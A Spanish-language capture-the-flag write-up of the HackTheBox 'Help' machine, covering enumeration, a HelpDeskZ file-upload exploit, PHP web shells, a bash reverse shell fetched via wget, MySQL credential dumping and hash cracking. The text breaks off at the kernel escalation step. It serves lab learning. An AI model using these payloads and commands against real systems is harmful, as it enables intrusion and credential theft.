---
layout      : post
title       : "HackTheBox - Help"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png
category    : [ htb ]
tags        : [ kernel-exploit, HelpDeskZ, ticket-support, file-upload ]
---
Máquina Linux nivel fácil. Investigaremos subidas de archivos **.php** en el servicio **HelpDeskZ**, jueguitos sucios con **MySQL** y una explotación de un kernel con ganas de morir.

![170helpHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170helpHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [cymtrick](https://www.hackthebox.eu/profile/3079).

A tope con vulnerabilidades conocidas...

Nos encontraremos una web por default ofrecida por **Apache**, profundizando en ella encontraremos un servicio llamado `HelpDeskZ`, volviendo a profundizar encontraremos una vulnerabilidad para explotar una subida de archivos (muy loca, pero interesantísima), jugaremos con ella para subir un archivo `.php` y lograr ejecutar comandos en el sistema, finalmente conseguiremos ejecutar una **reverse Shell** como el usuario **help**.

Estando en el sistema (no sé si es necesario para la máquina, pero lo hicimos) encontramos unas credenciales por medio de `MySQL`, serán válidas para obtener una sesión `SSH` como **help**.

Enumerando lo que tenemos a la mano, nos fijaremos cuidadosamente en la versión del kernel, si buscamos cositas relacionadas con ella llegaremos a un exploit, ¿qué hace? Pues explotar el kernel 🙃 e.e Si la explotación es exitosa nos devolvería una **Shell** como el usuario **root**, jugaremos con ella para lograrlo.

...

#### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Bastante R34LG4LIFE, lo cual ta buenisimooooooooooooooooo.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Buenas noches, siga, tome asiento por favor.

1. [Enumeración](#enumeracion).
  * [Enumeración de puertos con nmap](#enum-nmap).
  * [Enumeramos el servidor web (puerto 80)](#puerto-80).
2. [Explotación, exploramos el servicio de tickets **HelpDeskZ**](#explotacion).
  * [Obtenemos ejecucion remota de comandos con un archivo <u>.php</u> como adjunto en un **ticket**](#exp-helpdeskz-rce).
    * [--- Leemos el código de la web para entender por qué podemos subir archivos **.php** aunque la web mostrara que no era un formato válido](#code-review-php).
3. [Conseguimos credenciales para obtener una Shell con **SSH**](#dump-mysql2ssh).
  * [Empezamos a dumpear la base de datos <u>support</u>](#dump-db-mysql).
  * [Seguimos dumpeando y encontramos credenciales](#dump-db-mysql-staff).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

---

### Enumeración de puertos con nmap [🔗](#enum-nmap) {#enum-nmap}

Empezaremos enumerando que puertos están abiertos en la máquina, esto lo haremos con la ayuda de **nmap**:

```bash
❱ nmap -p- --open -v 10.10.10.121 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos responde con:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.121
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.121 ()	Status: Up
Host: 10.10.10.121 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///
# Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90.73 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Tenemos la posibilidad de obtener una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |
| 3000   | No sabemos que será **PPP**, veamos si con el siguiente escaneo logramos profundizar. |

Ahora que tenemos los puertos activos que maneja la máquina haremos otro escaneo, esta vez para ver que versiones y scripts relacionan a cada servicio encontrado:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.121
    [*] Open ports: 22,80,3000

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80,3000 -sC -sV 10.10.10.121 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p 22,80,3000 -sC -sV -oN portScan 10.10.10.121
Nmap scan report for 10.10.10.121
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25.82 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 |
| 80     | HTTP     | Apache httpd 2.4.18 |
| 3000   | HTTP     | Node.js Express |

Bien, nada llamativo, pero sabemos que el puerto **3000** sostiene un servidor con **node**, tamos bien... Por ahora nada más, profundicemos a keeeeeeee!

...

### Puerto 80 [🔗](#puerto-80) {#puerto-80}

Si nos fijamos en nuestro escaneo de versiones, vemos que el puerto **80** sostiene la página por default ofrecida por **Apache**:

![170page80_apacheDefault](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_apacheDefault.png)

Claramente nada interesante, jugando en internet con la versión de **Apache** tampoco vemos nada, intentemos ver si existen directorios fuera de nuestra vista:

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000024:   403        11 L     32 W       296 Ch      ".htaccess"
000000023:   403        11 L     32 W       291 Ch      ".hta"
000000025:   403        11 L     32 W       296 Ch      ".htpasswd"
000002180:   200        375 L    968 W      11321 Ch    "index.html"
000002305:   301        9 L      28 W       317 Ch      "javascript"
000003694:   403        11 L     32 W       300 Ch      "server-status"
000004001:   301        9 L      28 W       314 Ch      "support"
...
```

Opa, encontramos 2 directorios llamativos, `javascript` y `support`, si exploramos `javascript` nos indica que no tenemos permisos para ver su contenido; peeeeeeero si intentamos con `support` caemos acá:

![170page80_support](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support.png)

😯 Un servicio llamado [HelpDeskZ](https://www.helpdeskz.com/) que nos permite darle a nuestro sitio un apartado de soporte mediante **tickets**, interesante, sigamos viendo...

Hay un apartado `/login`, pero probando credenciales por default no logramos pasarlo, intentamos algunos payloads de inyecciones conocidas pero tampoco. Jugando con los demás ítems vemos uno para enviar nuestro ticket:

![170page80_support_formTickets](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_formTickets.png)

Tenemos un formulario para detallar el problema, vemos un campo en el que podemos agregar un archivo, generemos uno para probar si podemos subir objetos `.php`:

```bash
❱ cat holiwis.php
<?php system("id"); ?>
```

El archivo en caso de ser interpretado por alguna web nos deberia devolver el resultado del comando `id`, intentemos enviar el formulario pero ahora agregando el archivo:

![170page80_support_formTickets_file](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_formTickets_file.png)

Le pasamos el **captcha** y damos clic en `Submit`.

La web nos responde:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_fileNotAllowed.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que al parecer no podemos subir archivos `.php`, podriamos intentar cambiar el contenido agregando `GIF8;` al inicio del objeto para que el sistema y la web interpreten que el contenido es un `gif`, pero realmente es codigo `.php`. Peero esto no nos funciona, si jugamos con la extension tampoco llegamos a ningun lado, así que sigamos enumerando la web...

Podemos ver que recursos esta sosteniendo `/support` con ayuda de nuevo de `wfuzz`:

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/support/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000015:   200        17 L     42 W       378 Ch      ".gitattributes"
000000025:   403        11 L     32 W       304 Ch      ".htpasswd"
000000024:   403        11 L     32 W       304 Ch      ".htaccess"
000000023:   403        11 L     32 W       299 Ch      ".hta"
000001243:   301        9 L      28 W       326 Ch      "controllers"
000001316:   301        9 L      28 W       318 Ch      "css"
000001748:   200        3 L      23 W       1144 Ch     "favicon.ico"
000002153:   301        9 L      28 W       321 Ch      "images"
000002174:   301        9 L      28 W       323 Ch      "includes"
000002181:   200        96 L     236 W      4453 Ch     "index.php"
000002337:   301        9 L      28 W       317 Ch      "js"
000004296:   301        9 L      28 W       322 Ch      "uploads"
000004387:   301        9 L      28 W       320 Ch      "views"
...
```

Bueno, varias cositas, las interesantes o llamativas son:

* `.gitattributes`
* `uploads`
* `views`

El único que nos da contenido es `.gitattributes`, pero nada relevante para seguirlo. Los demás recursos nos envían de vuelta a la página por default de **Apache**, o sea, hace un redirect...

Jugando con cada uno de ellos para ver si existían recursos dentro, encontramos que al parecer `uploads` guarda los tickets que subimos, ya sea tooodo el ticket o los adjuntos:

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.121/support/uploads/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload 
=====================================================================

000000023:   403        11 L     32 W       307 Ch      ".hta"
000000025:   403        11 L     32 W       312 Ch      ".htpasswd"
000000024:   403        11 L     32 W       312 Ch      ".htaccess"
000000693:   301        9 L      28 W       331 Ch      "articles"
000002181:   302        0 L      0 W        0 Ch        "index.php"
000004137:   301        9 L      28 W       330 Ch      "tickets"
...
```

Pero si intentamos direccionarnos hacia `tickets` nos redirecciona a la pantalla por default :( y si seguimos intentando profundizar en su contenido no encontramos nada más.

Intentando subir archivos y despues buscarlos en la ruta `/support/uploads/tickets` no encontramos nada ):

...

## Explotación [#](#explotacion) {#explotacion}

Buscando vulnerabilidades relacionadas con `HelpDeskZ` encontramos dos principalmente, pero solo uno que no necesita credenciales para funcionar:

* [**HelpDeskZ 1.0.2** - Arbitrary File Upload](https://www.exploit-db.com/exploits/40300).

Viendo el código y lo que hace (en el propio código explica la explotación) el creador nos explica algo interesante:

> "The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file."
> "So by guessing the time the file was uploaded, we can get RCE"

Pero leyendo atentamente recordamos que a nosotros no nos deja subir archivos `.php`, o sea que quizás estamos en una versión más adelante a la que explota este exploit...

Peeeeeeeeeeeeeeeeeeeeeeeeero este exploit me hizo dar una idea de como trabajan los administradores de `HelpDeskZ` y que quizás nuestra versión:

* También tome los nombres de los archivos y los "ofusque" en **md5**, pero que al final le agregue la extensión real del archivo.

La cosa es que necesitaríamos poder subir un archivo `.php` o con contenido `.php` que sea interpretado.

...

No fue necesario empezar a profundizar porque el siguiente link que había abierto nos iluminaba (muy en la cara, **lo cual ta feo**) con que hacer:

* [How to upload a shell in HelpdeskZ v1.0.2](https://wikihak.com/how-to-upload-a-shell-in-helpdeskz-v1-0-2/).

En él hace exactamente lo mismo, cambia pequeñísimos detalles pero es igual. Lo único que cambia es que nos indica esto:

> Submit New ticket and upload the shell: <span style="color: yellow;">**Ignore** the <u>file not allowed warning</u><span>

Oooooh, al parecer en su **PoC** le da igual que salga el mensaje que no puede subir X tipo de archivo y aun así la explota, esto nos da la mano para pensar que podemos intentar lo mismo. El artículo nos brinda un código para explotar la máquina:

### Entendiendo un poco que hace el exploit [🔗](#reading-exp-helpdeskz) {#reading-exp-helpdeskz}

---

```py
import hashlib
import time
import sys
import requests
import calendar

helpdeskzBaseUrl = "http://10.10.10.121/support/uploads/tickets/" # change this
fileName = "reverse_shell.php" # Your reverse shell

response = requests.head('http://10.10.10.121') # Change this
serverTime=response.headers['Date'] # getting the server time
timeFormat="%a, %d %b %Y %H:%M:%S %Z"
currentTime = int(calendar.timegm(time.strptime(serverTime,timeFormat)))

for x in range(0, 800):
   plaintext = fileName + str(currentTime - x)
   md5hash = hashlib.md5(plaintext.encode()).hexdigest()
   url = helpdeskzBaseUrl+md5hash+'.php'
   print(url)

   response = requests.head(url)
   if response.status_code == 200:
      print("found!")
      sys.exit(0)

print("Sorry, I did not find anything")
```

En el nos **spoilea** que exploto ESTA máquina (la máquina `help`, por si no se entiende :P), así que por un lado estamos felices porque encontramos algo, **pero sabemos que ese algo nos va a funcionar si o si :l**

Hablemos de que hace este y el anterior exploit rápidamente:

1. Extrae la fecha en la que hacemos la ejecución del programa (en la que hace la conexión con la web, pero como es tan rápido, prácticamente es el momento en que ejecutamos el script).
2. La pasa a formato [timegm](https://docs.python.org/3/library/calendar.html#calendar.timegm): O sea, la fecha a **timestamp value**.
3. Y hace **800** peticiones (da igual el número, pueden ser 10, esto siempre y cuando se suba el archivo y de una se ejecute el exploit) para:
  * Tomar la fecha actual de ejecucion e irle restando `1,2,3,4,...,800`. Concatena el nombre original del archivo a esa resta.
  * Encripta el valor de `nombrearchivoTIMESTAMP` en formato **MD5**.
  * Y al final le agrega la extensión `.php`
  * **Si en algún momento de las 800 peticiones encuentra que en X periodo de tiempo se subió Y archivo, nos mostrara la URL asociada.**

...

### Obtenemos RCE con un archivo <u>.php</u> [🔗](#exp-helpdeskz-rce) {#exp-helpdeskz-rce}

Perfecto, pues cambiémoslo para que quede con nuestra data:

```py
...
fileName = "holiwis.php"
...
```

Ahora, creamos de nuevo un ticket, adjuntamos el archivo `holiwis.php`, vemos que nos responda `File is not allowed` y ejecutamos el exploit para ver si encuentra el archivo:

```bash
❱ python3 tryRCE.py
...
http://10.10.10.121/support/uploads/tickets/e536560d711ec6b799cdd6bff5df7ff1.php
http://10.10.10.121/support/uploads/tickets/7f809bc1c8849caf3158f4cfae9b4d84.php
http://10.10.10.121/support/uploads/tickets/b312527ca778b642e03ee24e44918aeb.php
http://10.10.10.121/support/uploads/tickets/d54ee70b5314543bb595b6690dfd9a91.php
http://10.10.10.121/support/uploads/tickets/21cdbb35831b91f5f551d79e0e5bad58.php
found!
```

OPAAA, pues visitemos ese link:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170page80_support_foundTicketRCE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

EJEEEEEEEEEEEE, tenemos ejecución remota de comandooooooooooooooooooooooos!!

Ahora generemos un archivo que nos permita ejecutar cualquier comando que le pasemos por una variable **GET**:

```bash
❱ cat holiwis.php 
<?php system($_GET['xmd']); ?>
```

Entonces, le pasaremos nuestro comando a través de la variable `xmd` y esta será interpretada por la función `system`, generemos el ticket y busquemos el archivo:

```bash
❱ python3 tryRCE.py 
http://10.10.10.121/support/uploads/tickets/8ea50935d73ed6f424a8a79adfb34de0.php
http://10.10.10.121/support/uploads/tickets/240236ef9c7351d8334a14df56870917.php
http://10.10.10.121/support/uploads/tickets/ee130b3f3dc98c3e9a71682e0bece6cb.php
http://10.10.10.121/support/uploads/tickets/22d8b499c06c57f6728ead123c0fede8.php
http://10.10.10.121/support/uploads/tickets/a21b24a794cf5736c769a2f19e42e6f9.php
http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php
found!
```

Validamos:

```bash
❱ curl http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=hostname
help
```

```bash
❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=hostname;id" 
help
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
```

Perfectooo, ahora si tenemos control con respecto a que comando ejecutamos, generemos una reverse Shell:

Intentando con `bash -i >& ...` no logramos ejecutarlo directamente, también vemos que `cURL` no existe como binario (`which+curl`), peeeero si existe `wget`:

> Tendremos que agregar los `+` para que los tome como espacios si es que ejecutamos todo desde la `bash`.

```bash
❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=which+wget" 
/usr/bin/wget
```

Así que podemos probar a subir un archivo al sistema con código `bash` y posteriormente ejecutarlo:

```bash
❱ cat rere.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.2/4433 0>&1
```

Levantamos un servidor web con **Python**:

```bash
❱ python3 -m http.server
```

Subimos archivo `.sh` con **wget** al directorio `/tmp`:

```bash
# wget http://10.10.14.2:8000/rere.sh -O /tmp/rere.sh
❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=wget+http://10.10.14.2:8000/rere.sh+-O+/tmp/rere.sh" 
```

Validamos que exista:

```bash
# ls -la /tmp/rere.sh
❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=ls+-la+/tmp/rere.sh" 
-rw-r--r-- 1 help help 133 Jul 21 25:25 /tmp/rere.sh
```

Ahora, nos ponemos en escucha por el puerto que pusimos en el archivo, en mi caso el **4433**:

```bash
❱ nc -lvp 4433
```

Y finalmente ejecutamos el script que subimos:

```bash
# bash /tmp/rere.sh
❱ curl "http://10.10.10.121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156.php?xmd=bash+/tmp/rere.sh" 
```

Esperamos un momento yyyy en nuestro listeneeeeeeer:

![170bash_helpRevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpRevSH.png)

Listones, estamos dentro del sistema como el usuario **help**, hagamos [tratamiento de la TTY](https://notes.dettlaff.xyz/recursos/tratamiento-de-la-tty) así evitamos preocuparnos por si ejecutamos `CTRL+C`, logramos tener histórico y además conseguimos una linda Shell :P

...

Es muy incómodo estar colocando `+` a cada espacio cada que queramos ejecutar algo en el sistema, además de tener que movernos al final de la cadena y ay no jajaj, aprovechemos la oportunidad y creémonos un script que:

* Nos encuentre el archivo con ayuda del timestamp.
* Y nos permita ejecutar comandos con comodidad.

> Intente hacer la creacion del ticket, pero el jugar con ese **catpcha** fue un poco doloroso, la mayoria de intentos son fallidos y va cambiando otro valor, así que F

Acá se los dejo (junto al archivo que deberíamos subir):

> [helpdeskFind_RCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/help)

```bash
❱ python3 helpdeskFind_RCE.py 
[+] Encontrando archivo: http://10.10.10.121/support/uploads/tickets/99500535e6ed7f2de07ad7b03c5791f7.php ✔
[+] Ejecutando id en el sistema: ✔

uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)

[+] A r0mp3r t0do!
```

```bash
❱ python3 helpdeskFind_RCE.py -c 'uname -a'
[+] Ejecutando uname -a en el sistema: ✔

Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

[+] A r0mp3r t0do!
```

tamos!

...

### Exploramos el porqué nos dejó subir archivos <u>.php</u> [🔗](#code-review-php) {#code-review-php}

Ya estando en la máquina intentemos buscar el código fuente de la web y ver el porqué nos dejó jugar con archivos `.php` aunque el mensaje fuera otro.

Enumerando llegamos a los objetos que controlan las acciones del portal:

```bash
help@help:/var/www/html/support/controllers$ ls -la
total 88
drwxr-xr-x  5 root root  4096 Nov 28  2018 .
drwxr-xr-x 11 root root  4096 Nov 27  2018 ..
drwxr-xr-x  2 root root  4096 Jan  5  2016 admin
drwxr-xr-x  2 root root  4096 Jan  5  2016 client
-rw-r--r--  1 root root  1192 Jan  5  2016 home_controller.php
-rw-r--r--  1 root root    14 Jan  5  2016 .htaccess
-rw-r--r--  1 root root   202 Jan  5  2016 index.php
-rw-r--r--  1 root root  6673 Jan  5  2016 knowledgebase_controller.php
-rw-r--r--  1 root root  2575 Jan  5  2016 login_controller.php
-rw-r--r--  1 root root  1714 Jan  5  2016 lost_password_controller.php
-rw-r--r--  1 root root  1586 Jan  5  2016 news_controller.php
drwxr-xr-x  3 root root  4096 Nov 27  2018 staff
-rw-r--r--  1 root root   724 Jan  5  2016 staff_controller.php
-rw-r--r--  1 root root 13002 Jan  5  2016 submit_ticket_controller.php
-rw-r--r--  1 root root   422 Jan  5  2016 user_account_controller.php
-rw-r--r--  1 root root  8772 Nov 28  2018 view_tickets_controller.php
```

Vemos `submit_ticket_controller.php`, si vamos recorriéndolo llegamos a esta parte:

```bash
help@help:/var/www/html/support/controllers$ cat submit_ticket_controller.php
```

```php
...
if(!isset($error_msg) && $settings['ticket_attachment']==1){
    $uploaddir = UPLOAD_DIR.'tickets/';
    if($_FILES['attachment']['error'] == 0){
        $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
        $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
        $fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
        $uploadedfile = $uploaddir.$filename;
        if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
            $show_step2 = true;
            $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
        }else{
            $fileverification = verifyAttachment($_FILES['attachment']);
            switch($fileverification['msg_code']){
                case '1':
                $show_step2 = true;
                $error_msg = $LANG['INVALID_FILE_EXTENSION'];
                break;
                case '2':
                $show_step2 = true;
                $error_msg = $LANG['FILE_NOT_ALLOWED'];
                break;
                case '3':
                $show_step2 = true;
                $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
                break;
            }
        }
    }
}
...
```

Bien, esa parte es la que toma el `attachment` (archivo adjunto) y lo procesa.

Podemos detallar algunas cosas:

1. Intente buscar alguna definición de la ruta `UPLOAD_DIR`, pero al estar al lado de `/tickets`, podemos intuir que toma:
  * `UPLOAD_DIR` como `http://10.10.10.121/support/uploads` `/tickets`.
2. Vemos que extrae la extensión del objeto que subimos.
3. Toma el nombre del objeto, extrae la fecha actual en que esta siendo subido, junta los dos valores y los pasa a **MD5** (toma sentido el exploit) y le agrega la extensión.
4. **SUBE EL ARCHIVO con la función [move_uploaded_file](https://www.php.net/manual/es/function.move-uploaded-file.php)**, aunque tenga errores o lo que sea que pase,
5. **PEEEEEEERO EN NINGÚN MOMENTO BORRA NADA**, por eso el exploit se empeña en buscarlo, el backend no lo borra del sistema 😳

Perfectisimooooooooooo, vaya fallito eh! 

* [Recurso para entender los tipos de **$_FILES**](https://www.php.net/manual/es/features.file-upload.post-method.php).
* [Acá el fuente de **submit_ticket_controller.php**](https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php).

Pues sigamos, ya sabemos por qué podemos ver un archivo que supuestamente nos devolvía error.

...

## Conseguimos credenciales para obtener una Shell con <u>SSH</u> [#](#dump-mysql2ssh) {#dump-mysql2ssh}

Enumerando los directorios desde donde salimos hacia atrás, encontramos un objeto llamado `config.php` en la carpeta `/includes`:

```bash
help@help:/var/www/html/support/includes$ ls -la
total 152
...
-rwxrwxrwx  1 root root   274 Nov 27  2018 config.php
...
```

Si vemos su contenido encontramos unas credenciales contra la base de datos `support`:

```bash
help@help:/var/www/html/support/includes$ cat config.php 
<?php
        $config['Database']['dbname'] = 'support';
        $config['Database']['tableprefix'] = '';
        $config['Database']['servername'] = 'localhost';
        $config['Database']['username'] = 'root';
        $config['Database']['password'] = 'helpme';
        $config['Database']['type'] = 'mysqli';
?>
```

Pues perfecto, tomémoslas y probemos si son válidas:

* `root` : `helpme`

...

### Empezamos a dumpear la base de datos <u>support</u> [🔗](#dump-db-mysql) {#dump-db-mysql}

---

```bash
help@help:/var/www/html/support/includes$ mysql -u root -p
```

![170bash_helpSH_mysqlDone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysqlDone.png)

Si señores, tamos dentro de **MySQL** con las credenciales de **root**, veamos si hay algo útil:

> Probando las credenciales contra **SSH** no logramos nada, solo son validas en **MySQL**.

Veamos que bases de datos hay:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| support            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

Las 4 de siempre, enfoquémonos en `support`, usémosla y veamos sus tablas:

```sql
mysql> use support;
```

```sql
mysql> show tables;
+------------------------+
| Tables_in_support      |
+------------------------+
| articles               |
| attachments            |
| canned_response        |
| custom_fields          |
| departments            |
| emails                 |
| error_log              |
| file_types             |
| knowledgebase_category |
| login_attempt          |
| login_log              |
| news                   |
| pages                  |
| priority               |
| settings               |
| staff                  |
| tickets                |
| tickets_messages       |
| users                  |
+------------------------+
19 rows in set (0.00 sec)
```

Uff, varios nombres llamativos:

* `login_log`
* `settings`
* `staff`
* `tickets`
* `tickets_messages`
* `users`

Primero veamos si hay algo llamativo en `users`:

![170bash_helpSH_mysql_userstable](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysql_userstable.png)

Bien, varios intentos míos 🥴, pero además hay un usuario nuevo, `helpme`... Si tomamos cualquier contraseña (hash) y [validamos su formato](https://www.tunnelsup.com/hash-analyzer/) vemos que son tipo `SHA1 (or SHA 128)`.

Pues apoyémonos de **JtR** (`John The Ripper`) para intentar crackear ese hash, guardémoslo en un archivo y ejecutemos:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt helpme.hash 
...
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
godhelpmeplz     (?)
1g 0:00:00:00 DONE (2021-07-21 18:19) 1.176g/s 9220Kp/s 9220Kc/s 9220KC/s godhibiki..godhelpmee
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

OPA, encontramos una coincidencia, la contraseña en texto plano es `godhelpmeplz` :o

En teoría estas credenciales son válidas contra el servidor web, o sea, contra el login (**si lo son 😎**). Pero probando contra **SSH** ya sea con `root` o `help` no son funcionales :(

...

### Seguimos dumpeando y encontramos nuevas credenciales [🔗](#dump-db-mysql-staff) {#dump-db-mysql-staff}

Veamos si hay algo en las otras tablas...

Jugando llegamos a la data de la tabla `staff`:

```sql
mysql> SELECT * FROM staff;
```

Encontramos varios campos y data juguetona, filtremos por los interesantes:

![170bash_helpSH_mysql_stafftable](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_mysql_stafftable.png)

Otras credenciales, ahora hacen referencia a un usuario llamado **admin**, tomemos la pw y hagamos el mismo procedimiento de antes a ver si conseguimos algo:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 
...
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (?)
1g 0:00:00:00 DONE (2021-07-21 18:34) 4.545g/s 183636p/s 183636c/s 183636C/s abygail..Thomas1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

También hay coincidencias, si probamos de nuevo contra **SSH** logramos una sesión como el usuario **help**:

```bash
❱ ssh help@10.10.10.121
```

![170bash_helpSH_ssh_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_ssh_done.png)

Así que ya podemos olvidarnos de la **reverse Shell** y quedarnos con la nueva **SSH** (:

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

> Enumerando el sistema cai en varios **rabbit hole** al no buscar primero cosas esenciales :( uno con `exim4`, otro con `graphql`, con `js`, bueno, algunas perdidas e.e

Viendo las características del sistema nos encontramos la versión del kernel:

```bash
help@help:/tmp$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Si buscamos en la web alguna vulnerabilidad relacionada la versión `4.4.0-116-generic` caemos a este recurso:

